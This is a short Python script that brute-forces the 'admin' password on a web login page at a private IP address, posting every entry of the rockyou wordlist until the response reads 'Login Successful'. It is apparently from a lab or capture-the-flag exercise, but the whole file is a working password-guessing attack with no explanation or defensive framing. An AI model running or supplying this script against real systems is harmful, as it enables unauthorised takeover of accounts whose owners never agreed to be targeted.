import requests

url = "http://192.168.160.242:5000/login"
username = "admin"
wordlist = "/usr/share/wordlists/rockyou.txt"

with open(wordlist, "r", encoding="latin-1") as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    data = {
        "account": username,
        "password": password
    }
    try:
        response = requests.post(url, data=data, timeout=5)  # 加超时
        if "Login Successful" in response.text:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried: {password}")
    except requests.exceptions.Timeout:
        print(f"[!] Timeout when trying: {password}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")